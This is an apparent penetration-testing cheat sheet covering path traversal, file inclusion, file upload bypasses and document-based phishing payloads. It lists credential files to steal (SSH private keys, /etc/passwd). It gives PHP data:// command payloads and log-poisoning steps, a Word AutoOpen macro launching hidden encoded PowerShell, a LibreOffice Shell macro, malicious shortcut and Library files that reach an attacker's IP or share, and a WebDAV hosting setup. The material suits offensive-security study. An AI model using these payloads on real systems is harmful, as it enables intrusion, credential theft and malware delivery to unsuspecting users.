Last update: 2025.11.14
# Path Traversal
### Files to Check:
###### Linux:
- `/etc/passwd`
- `/home/<user>/.ssh/id_rsa`; `/home/<user>/.ssh/id_ed25519`
- `/home/<user>/.ssh/authorized_keys` (check key format)
- `/var/log/apache2/access.log`
- `/etc/apache2/sites-available/000-default.conf`
###### Windows:
- `C:\Windows\System32\drivers\etc\hosts`
- `C:\inetpub\logs\LogFiles\W3SVC1\` (IIS log folders)
- `C:\inetpub\wwwroot\web.config`
- `C:\xampp\apache\logs\access.log`
- `C:\users\<user>\.ssh\id_rsa`
###### General:
- Configuration files
- Log files

---
# File Inclusions
### Log Poisoning:
###### Apache
- Set `User-Agent` header as PHP payload
- LFI include log file (`/var/log/apache2/access.log`)
### PHP Wrappers:
###### `php://filter`:
- `php://filter/resource=<file>`
- `php://filter/convert.base64-encode/resource=<file>`
###### `data://`:
Requirements: `allow_url_include` must be enabled
- `data://text/plain,<?php%20echo%20system('ls');?>`
- `data://text/plain;base64,<php-payload-base64>`

---
# File Upload
### Useful Upload Directories:
###### Linux:
- `/var/www/html/`
- SMB share (if path known)
###### Windows:
- `C:\xampp\htdocs\` (Apache web root)
### Extension Bypass:
###### Common Techniques:
- Case weaving: `.pHp`, `.pHP`
- Rename after upload
- Upload twice. Verbose error => brute force web server contents
- Overwrite system files (e.g., `authorized_keys`, `/etc/shadow`)
###### PHP:
- `.phtml`, `.php3`, `.php4`, `.php5`, `.inc`
### ODT Files:
###### CVE-2023-2255 (Requires user interaction):
GitHub: https://github.com/elweth-sec/CVE-2023-2255
Command: `python CVE-2023-2255.py --cmd '<cmd>' --output filename.odt`
###### Macros (Requires user interaction):
**Script:**
- https://github.com/0bfxgh0st/MMG-LO (RCE)
- https://github.com/rmdavy/badodf/blob/master/badodt.py (NTLM theft)
**Manual:**
Macro module: "Tools" => "Macros" => "Organize Macros" => "Basic"
Payload:
```vb
Sub Main
	Shell("cmd /c <cmd>")
End Sub
```
Trigger events: "Tools" => "Customize => "Events", assign macro to Open Document

### Microsoft Office:
###### Macros:
1. "View" => "Macros"
2. New "mymacro (document)", create
3. Save as `.doc`
```vb
Sub AutoOpen()
MyMacro
End Sub

Sub Document_Open()
MyMacro
End Sub

Sub MyMacro()
Dim Str As String
' Can use web cradle here, must be UTF-16LE encoded.
Str = Str + "powershell.exe -nop -w hidden -enc <base64-16LE>"
CreateObject("Wscript.Shell").Run Str
End Sub
```
Breaking payload into chunks:
```python
str = "powershell.exe -nop -w hidden -enc <base64-16LE>"
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
### Windows Library Files
###### Library File: `config.Library-ms`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://<IP>:<PORT></url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```
###### Shortcut File:
Windows: right-click => new => shortcut; enter command
```
pylnk3 create -a <args> <target> exploit.lnk
```
```
pylnk3 create "\\\\<IP>\\share\\shell.exe" exploit.lnk
```
###### WebDAV Server:
```
$ pyvenvstart
$ pip install wsgidav
$ pip install cheroot
$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./
```

---